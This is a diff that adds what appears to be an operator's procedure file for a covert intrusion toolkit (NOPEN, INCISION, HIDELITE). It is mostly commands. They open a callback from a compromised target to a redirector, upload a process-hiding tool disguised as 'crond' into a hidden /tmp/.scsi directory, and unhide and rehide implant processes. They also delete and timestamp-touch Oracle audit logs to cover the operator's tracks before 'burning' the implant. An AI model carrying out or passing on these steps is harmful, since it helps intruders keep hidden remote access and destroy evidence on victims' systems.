@@ -1,0 +1,74 @@
+############################################################
+# DITTLELIGHT  (HIDELIGHT)
+############################################################
+
+### To run the unix oracle db scripts, you must do them outside of an INCISION process
+### therefore, you can use DITTLELIGHT (HIDELITE) to unhide your nopen window
+### You must run HIDELIGHT on a process with a parent PID of "1" so
+### do a callback to your redirector and run hidelite on the callback window
+
+### Hidelite
+### Create a callback window
+
+# On redirector:
+-nrtun NOPEN_PORT
+
+# On target:
+-call  REDIR_IP NOPEN_PORT
+
+### upload the correct version of hidelite for sparc or linux in a temp directory:
+mkdir /tmp/.scsi
+-cd /tmp/.scsi
+-put /current/bin/hidelite.sparc crond
+	# or 
+-put /current/bin/hidelite.linux crond
+
+
+###  Obtain the PIDs of your nopen windows.
+###  The callback window will have a parent pid of (1):
+###  Run -pid in each nopen window:
+-pid
+
+### In a nopen window OTHER than the callback window you are about to unhide,
+### run hidelite to unhide the callback window:
+./crond -u -p NOPEN_CALLBACK_WINDOW_PID 
+
+### Remove hidelite from the target:
+-rm crond
+
+### In the CALLBACK window, verify that this window has now lost its INCISION privileges
+### and can no longer see the other nopen PIDS
+
+ps -ef | grep NOPEN_PID
+
+### In any window, you can run =psdiff to verify that either the callback window is
+### unhidden or that the other (INCISION privileged) nopen windows are invisible
+### to the callback window.
+=psdiff
+
+### You can now run the oracle queries in the UNHIDDEN CALLBACK window.
+### When done,  simply -exit the unhidden callback window.
+
+### If for some reason you need to rehide a process, upload HIDELITE
+### and run the following from a HIDDEN (privileged) window:
+
+### To hide again
+./crond -h -p NOPENPID
+-rm crond
+
+
+### If you were running oracle commands, you can now clean them up:
+### Cleanup the logs created from the oracle scripts:
+### ex:
+# -ls -t /opt/mnt/oracle/product/9.2.0/rdbms/audit
+# -rm <NEW_FILES>
+# -touch /opt/mnt/oracle/product/9.2.0/rdbms/audit/ora_1473.aud /opt/mnt/oracle/ product/9.2.0/rdbms/audit
+
+### Remove your working directory  and -burn nopen when done with op
+-cd /tmp
+-rm .scsi
+-lt /tmp
+-burnBURN
+
+
+
